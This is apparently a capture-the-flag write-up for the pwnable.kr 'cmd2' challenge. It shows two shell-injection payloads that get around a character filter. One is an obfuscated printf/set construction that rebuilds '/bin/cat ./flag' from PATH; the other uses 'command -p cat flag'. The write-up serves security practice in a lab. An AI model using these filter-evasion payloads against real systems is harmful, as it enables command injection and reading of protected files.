# pwnablekr cmd2

This is my solution. It's really crazy, and I'm a bit too lazy to explain it/barely 
know what I was thinking when I crafted this masterpiece. But, basically the idea is
you need a '/' (e.g. ./cat flag) in order to call a program without a path. So, have to think of some
clever way to get a '/' into a string.

The overall idea to this challenge is to leverage `sh` built-ins. Notice that I say `sh` and
not `bash`, that's because the program is doing a `system(...)` API call, which is actually a wrapper around
`exec("sh -c ...")`. There are major differences between the `sh` shell, and the `bash` shell.
 
```
$ ./cmd2 "\$(printf '%c%c%c%c%c%c%c%c %c%c%c%c%c%c' \$(set \$(printf '%c%c%c%c%c' \$ P A T H); 
set \$(eval echo \$1); echo \${1%no_command_execution_until_you_become_a_hacker}) b i n \$(set 
\$(printf '%c%c%c%c%c' \$ P A T H); set \$(eval echo \$1); echo 
\${1%no_command_execution_until_you_become_a_hacker}) c a t . \$(set \$(printf '%c%c%c%c%c' \$ 
P A T H); set \$(eval echo \$1); echo \${1%no_command_execution_until_you_become_a_hacker}) f l 
a g)"
```

There's a much simpler, almost cheating solution to this. Read the man page for sh built-in to 
understand it :)

```
$ ./cmd2 command -p cat flag
```

There's also a medium solution that somebody showed me, but I leave that as an open problem for the
reader :).



